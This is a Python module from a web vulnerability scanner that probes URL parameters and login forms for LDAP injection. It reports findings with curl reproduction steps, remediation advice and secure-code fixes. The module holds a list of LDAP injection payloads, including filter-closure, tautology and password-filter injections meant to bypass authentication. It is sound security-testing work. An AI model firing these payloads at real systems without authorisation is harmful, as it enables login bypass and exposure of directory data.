import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from scanner.core import Finding, Severity, ScanSession


LDAP_PAYLOADS = [
    ("*", "Wildcard injection"),
    (")(cn=*)", "Filter closure + wildcard"),
    ("*(|(mail=*))", "OR filter injection"),
    (")(&)", "Boolean filter injection (AND)"),
    (")(|(uid=*))", "OR uid enumeration"),
    ("*)(objectClass=*)", "Object class enumeration"),
    (")(sn=*", "Surname wildcard injection"),
    ("admin)(|(password=*))", "Password filter injection"),
    ("*)(uid=*))(|(uid=*", "Nested filter injection"),
    ("\\28", "Encoded parenthesis injection"),
    ("\\2a", "Encoded wildcard injection"),
    (")(cn=admin)(&(1=1", "Tautology injection"),
    ("x)(|(cn=*)(cn=x", "Double condition injection"),
]

LDAP_ERROR_PATTERNS = [
    (r"LDAP.*?error", "LDAP error"),
    (r"ldap_search", "LDAP search function"),
    (r"ldap_bind", "LDAP bind function"),
    (r"ldap_connect", "LDAP connection function"),
    (r"Invalid DN", "Invalid Distinguished Name"),
    (r"Bad search filter", "Bad LDAP filter"),
    (r"invalid filter", "Invalid LDAP filter"),
    (r"Filter Error", "LDAP filter error"),
    (r"javax\.naming\.directory", "Java LDAP exception"),
    (r"javax\.naming\.NamingException", "Java Naming exception"),
    (r"LDAPException", "LDAP exception"),
    (r"DSMLv2", "DSML error"),
    (r"ldap://", "LDAP URL leaked"),
    (r"ldaps://", "LDAPS URL leaked"),
    (r"cn=.*?,\s*dc=", "Distinguished Name leaked"),
    (r"ou=.*?,\s*dc=", "Organizational Unit leaked"),
    (r"Active Directory", "Active Directory reference"),
    (r"LDAP server", "LDAP server reference"),
    (r"directory service", "Directory service reference"),
    (r"unbalanced.*?parenthes[ie]s", "Unbalanced parentheses in filter"),
    (r"filter.*?syntax", "Filter syntax error"),
]

AUTH_BYPASS_INDICATORS = [
    (r"(?i)welcome|dashboard|profile|account|admin|logout|sign.?out", "Authenticated content indicators"),
    (r"(?i)session.*?created|logged.?in|login.?success", "Login success indicators"),
]


def _build_curl(method, url, data=None):
    cmd = f"curl -k -X {method} '{url}'"
    if data:
        cmd += f" -d '{data}'"
    return cmd


def _check_ldap_errors(body):
    """Check for LDAP-specific error messages in the response."""
    for pattern, description in LDAP_ERROR_PATTERNS:
        if re.search(pattern, body, re.IGNORECASE):
            return pattern, description
    return None, None


def _extract_snippet(body, pattern):
    match = re.search(pattern, body, re.IGNORECASE)
    if match:
        start = max(0, match.start() - 60)
        end = min(len(body), match.end() + 60)
        return body[start:end].replace('\n', ' ').strip()
    return ""


def _response_differs(baseline_resp, test_resp):
    if not baseline_resp or not test_resp:
        return False
    if baseline_resp.status_code != test_resp.status_code:
        return True
    bl = len(baseline_resp.text)
    tl = len(test_resp.text)
    if bl == 0:
        return tl > 0
    return abs(tl - bl) / max(bl, 1) > 0.15


def _get_baseline(session, url, param, original):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [original or "harmless"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
    resp = session.get(baseline_url)
    return resp


def _check_auth_bypass(baseline_text, test_text):
    """Check if the response suggests an authentication bypass."""
    for pattern, description in AUTH_BYPASS_INDICATORS:
        if re.search(pattern, test_text, re.IGNORECASE):
            if not baseline_text or not re.search(pattern, baseline_text, re.IGNORECASE):
                return pattern, description
    return None, None


def _test_url_params(session, url):
    """Test URL parameters for LDAP injection."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return

    for param, values in params.items():
        original = values[0] if values else ""
        baseline_resp = _get_baseline(session, url, param, original)
        baseline_text = baseline_resp.text if baseline_resp else ""

        for payload, description in LDAP_PAYLOADS:
            test_params = dict(params)
            test_params[param] = [payload]
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=test_query))

            resp = session.get(test_url)
            if not resp or resp.status_code in (404, 403):
                continue

            # Check for LDAP error messages
            error_pattern, error_desc = _check_ldap_errors(resp.text)
            if error_pattern and not re.search(error_pattern, baseline_text, re.IGNORECASE):
                snippet = _extract_snippet(resp.text, error_pattern)
                curl_cmd = _build_curl("GET", test_url)
                session.add_finding(Finding(
                    title=f"LDAP Injection (Error-Based) - {error_desc}",
                    severity=Severity.HIGH,
                    description=(
                        f"The URL parameter '{param}' is vulnerable to LDAP injection. "
                        f"When LDAP metacharacters ({description}) were injected, the application "
                        f"returned an LDAP-specific error ({error_desc}), confirming that user "
                        f"input reaches the LDAP query filter unsanitized. This can allow "
                        f"authentication bypass, data exfiltration, or directory enumeration."
                    ),
                    evidence=(
                        f"Parameter: {param}\n"
                        f"Payload: {payload}\n"
                        f"Technique: {description}\n"
                        f"Error Type: {error_desc}\n"
                        f"Error Pattern: {error_pattern}\n"
                        f"Error Snippet: {snippet}\n"
                        f"Test URL: {test_url}\n"
                        f"Response Status: {resp.status_code}"
                    ),
                    remediation=(
                        "1. Escape all LDAP special characters in user input before query construction:\n"
                        "   Characters to escape: \\ * ( ) / NUL\n"
                        "2. Use parameterized LDAP queries where supported.\n"
                        "3. Validate input against a strict allowlist (alphanumeric only for usernames).\n"
                        "4. Use LDAP framework functions for escaping (e.g., ldap.filter.escape_filter_chars).\n"
                        "5. Apply least privilege to the LDAP bind account."
                    ),
                    url=url,
                    module="ldap_injection",
                    cwe="CWE-90",
                    confirmed=True,
                    location=f"URL parameter '{param}' in query string of {parsed.path}",
                    parameter=param,
                    payload=payload,
                    request_method="GET",
                    response_status=resp.status_code,
                    curl_command=curl_cmd,
                    reproduction_steps=(
                        f"1. Open: {url}\n"
                        f"2. Set the '{param}' parameter to: {payload}\n"
                        f"3. Full test URL: {test_url}\n"
                        f"4. Observe the LDAP error ({error_desc}) in the response.\n"
                        f"5. Run: {curl_cmd}"
                    ),
                    developer_fix=(
                        f"File: The server-side code handling '{parsed.path}'.\n\n"
                        f"VULNERABLE pattern (do NOT use):\n"
                        f"  filter = '(uid=' + user_input + ')'\n"
                        f"  ldap_conn.search(base_dn, filter)\n\n"
                        f"SECURE pattern (Python):\n"
                        f"  from ldap3.utils.conv import escape_filter_chars\n"
                        f"  safe_input = escape_filter_chars(user_input)\n"
                        f"  filter = '(uid=' + safe_input + ')'\n"
                        f"  ldap_conn.search(base_dn, filter)\n\n"
                        f"SECURE pattern (Java):\n"
                        f"  String safe = LdapEncoder.filterEncode(userInput);\n"
                        f"  String filter = \"(uid=\" + safe + \")\";"
                    ),
                    affected_component=f"LDAP query construction in route handler for {parsed.path}",
                    references="https://owasp.org/www-community/attacks/LDAP_Injection | https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html",
                    detection_method=f"Injected LDAP metacharacters ({description}) into URL parameter and detected LDAP-specific error message ({error_desc}) in response absent from baseline.",
                ))
                return

            # Differential analysis: wildcard returning more data
            if payload == "*" and _response_differs(baseline_resp, resp):
                if resp.status_code == 200 and len(resp.text) > len(baseline_text) * 1.3:
                    curl_cmd = _build_curl("GET", test_url)
                    session.add_finding(Finding(
                        title="Potential LDAP Injection (Wildcard Data Leak)",
                        severity=Severity.HIGH,
                        description=(
                            f"The URL parameter '{param}' may be vulnerable to LDAP injection. "
                            f"When a wildcard character (*) was injected, the response was "
                            f"significantly larger than the baseline, suggesting the wildcard "
                            f"matched multiple LDAP entries and returned additional data."
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"Payload: *\n"
                            f"Baseline Response Length: {len(baseline_text)}\n"
                            f"Wildcard Response Length: {len(resp.text)}\n"
                            f"Length Ratio: {len(resp.text) / max(len(baseline_text), 1):.2f}x\n"
                            f"Test URL: {test_url}\n"
                            f"Response Status: {resp.status_code}"
                        ),
                        remediation=(
                            "1. Escape LDAP special characters (* \\ ( ) / NUL) in all user input.\n"
                            "2. Validate input format (e.g., alphanumeric only for usernames).\n"
                            "3. Limit LDAP search result count with size limits.\n"
                            "4. Use parameterized LDAP searches."
                        ),
                        url=url,
                        module="ldap_injection",
                        cwe="CWE-90",
                        confirmed=False,
                        location=f"URL parameter '{param}' in query string of {parsed.path}",
                        parameter=param,
                        payload="*",
                        request_method="GET",
                        response_status=resp.status_code,
                        curl_command=curl_cmd,
                        reproduction_steps=(
                            f"1. Open: {url}\n"
                            f"2. Set '{param}' to: *\n"
                            f"3. Compare the response with the original page.\n"
                            f"4. Run: {curl_cmd}"
                        ),
                        developer_fix=(
                            f"File: Code handling '{parsed.path}'.\n\n"
                            f"Escape wildcards before LDAP query:\n"
                            f"  safe = user_input.replace('*', '\\\\2a').replace('(', '\\\\28')"
                        ),
                        affected_component=f"LDAP query in route handler for {parsed.path}",
                        references="https://owasp.org/www-community/attacks/LDAP_Injection",
                        detection_method=f"Injected LDAP wildcard (*) into URL parameter and observed significantly larger response, suggesting multiple directory entries were returned.",
                    ))
                    return


def _test_forms(session, form):
    """Test form fields for LDAP injection."""
    action = form.get("action", "")
    method = form.get("method", "post").lower()
    inputs = form.get("inputs", [])
    source_url = form.get("source_url", action)
    parsed = urlparse(action)

    baseline_data = {}
    for inp in inputs:
        name = inp.get("name")
        if name:
            baseline_data[name] = inp.get("value", "test")

    if method == "post":
        baseline_resp = session.post(action, data=baseline_data)
    else:
        baseline_resp = session.get(action, params=baseline_data)

    if not baseline_resp:
        return
    baseline_text = baseline_resp.text

    for inp in inputs:
        name = inp.get("name")
        if not name:
            continue

        for payload, description in LDAP_PAYLOADS:
            test_data = dict(baseline_data)
            test_data[name] = payload

            try:
                if method == "post":
                    resp = session.post(action, data=test_data)
                else:
                    resp = session.get(action, params=test_data)
            except Exception:
                continue

            if not resp or resp.status_code in (404, 403):
                continue

            # Check for LDAP error messages
            error_pattern, error_desc = _check_ldap_errors(resp.text)
            if error_pattern and not re.search(error_pattern, baseline_text, re.IGNORECASE):
                snippet = _extract_snippet(resp.text, error_pattern)
                data_str = "&".join(f"{k}={v}" for k, v in test_data.items())
                curl_cmd = _build_curl(method.upper(), action, data=data_str)
                session.add_finding(Finding(
                    title=f"LDAP Injection in Form (Error-Based) - {error_desc}",
                    severity=Severity.HIGH,
                    description=(
                        f"The form field '{name}' at '{action}' is vulnerable to LDAP injection. "
                        f"When LDAP metacharacters ({description}) were injected into the field, "
                        f"the application returned an LDAP error ({error_desc}), confirming that "
                        f"user input is used directly in LDAP filter construction."
                    ),
                    evidence=(
                        f"Form Action: {action}\n"
                        f"Form Method: {method.upper()}\n"
                        f"Field: {name}\n"
                        f"Payload: {payload}\n"
                        f"Technique: {description}\n"
                        f"Error Type: {error_desc}\n"
                        f"Error Snippet: {snippet}\n"
                        f"Response Status: {resp.status_code}"
                    ),
                    remediation=(
                        "1. Escape all LDAP special characters in user input:\n"
                        "   * \\ ( ) / NUL -> \\2a \\5c \\28 \\29 \\2f \\00\n"
                        "2. Use parameterized LDAP queries.\n"
                        "3. Validate usernames/input against a strict allowlist.\n"
                        "4. Use LDAP framework escaping functions.\n"
                        "5. Implement rate limiting on authentication endpoints."
                    ),
                    url=source_url,
                    module="ldap_injection",
                    cwe="CWE-90",
                    confirmed=True,
                    location=f"Form field '{name}' in form at {action}",
                    parameter=name,
                    payload=payload,
                    request_method=method.upper(),
                    response_status=resp.status_code,
                    curl_command=curl_cmd,
                    reproduction_steps=(
                        f"1. Navigate to: {source_url}\n"
                        f"2. In the form submitting to {action}, set '{name}' to: {payload}\n"
                        f"3. Submit and observe the LDAP error in the response.\n"
                        f"4. Run: {curl_cmd}"
                    ),
                    developer_fix=(
                        f"File: The handler for {method.upper()} {action}.\n\n"
                        f"VULNERABLE:\n"
                        f"  filter = '(&(uid=' + username + ')(userPassword=' + password + '))'\n\n"
                        f"SECURE (Python/ldap3):\n"
                        f"  from ldap3.utils.conv import escape_filter_chars\n"
                        f"  safe_user = escape_filter_chars(username)\n"
                        f"  safe_pass = escape_filter_chars(password)\n"
                        f"  filter = '(&(uid=' + safe_user + ')(userPassword=' + safe_pass + '))'\n\n"
                        f"SECURE (PHP):\n"
                        f"  $safe = ldap_escape($input, '', LDAP_ESCAPE_FILTER);"
                    ),
                    affected_component=f"LDAP authentication/query in form handler for {action}",
                    references="https://owasp.org/www-community/attacks/LDAP_Injection | https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html",
                    detection_method=f"Injected LDAP metacharacters ({description}) into form field and detected LDAP error message ({error_desc}) in response absent from baseline.",
                ))
                return

            # Check for authentication bypass
            auth_pattern, auth_desc = _check_auth_bypass(baseline_text, resp.text)
            if auth_pattern and payload in ("*", ")(cn=*)", "*(|(mail=*))"):
                curl_cmd = _build_curl(method.upper(), action,
                                       data="&".join(f"{k}={v}" for k, v in test_data.items()))
                session.add_finding(Finding(
                    title="Potential LDAP Authentication Bypass",
                    severity=Severity.CRITICAL,
                    description=(
                        f"The form field '{name}' at '{action}' may allow LDAP authentication "
                        f"bypass. When LDAP metacharacters ({description}) were injected, the "
                        f"response contained indicators of successful authentication "
                        f"({auth_desc}) that were absent from the baseline response."
                    ),
                    evidence=(
                        f"Form Action: {action}\n"
                        f"Field: {name}\n"
                        f"Payload: {payload}\n"
                        f"Technique: {description}\n"
                        f"Auth Indicator: {auth_desc}\n"
                        f"Response Status: {resp.status_code}"
                    ),
                    remediation=(
                        "1. Escape all LDAP special characters before query construction.\n"
                        "2. Use LDAP bind authentication instead of search-based authentication.\n"
                        "3. Validate input format strictly (alphanumeric only).\n"
                        "4. Implement multi-factor authentication.\n"
                        "5. Monitor and alert on failed LDAP authentication attempts."
                    ),
                    url=source_url,
                    module="ldap_injection",
                    cwe="CWE-90",
                    confirmed=False,
                    location=f"Form field '{name}' in form at {action}",
                    parameter=name,
                    payload=payload,
                    request_method=method.upper(),
                    response_status=resp.status_code,
                    curl_command=curl_cmd,
                    reproduction_steps=(
                        f"1. Navigate to: {source_url}\n"
                        f"2. Set '{name}' to: {payload}\n"
                        f"3. Submit and check for authenticated content.\n"
                        f"4. Run: {curl_cmd}"
                    ),
                    developer_fix=(
                        f"File: The authentication handler for {action}.\n\n"
                        f"Use LDAP bind for authentication instead of search:\n"
                        f"  # Instead of searching with user-supplied credentials in the filter,\n"
                        f"  # use ldap_bind with the user's DN and password:\n"
                        f"  user_dn = 'uid=' + escape(username) + ',ou=users,dc=example,dc=com'\n"
                        f"  conn.simple_bind_s(user_dn, password)"
                    ),
                    affected_component=f"LDAP authentication in form handler for {action}",
                    references="https://owasp.org/www-community/attacks/LDAP_Injection | https://book.hacktricks.xyz/pentesting-web/ldap-injection",
                    detection_method=f"Injected LDAP metacharacters ({description}) into login form and detected authentication success indicators ({auth_desc}) absent from baseline.",
                ))
                return


def run(session: ScanSession) -> None:
    print("\n[*] Testing for LDAP Injection...")

    for url in session.crawled_urls:
        _test_url_params(session, url)

    for form in session.forms:
        _test_forms(session, form)
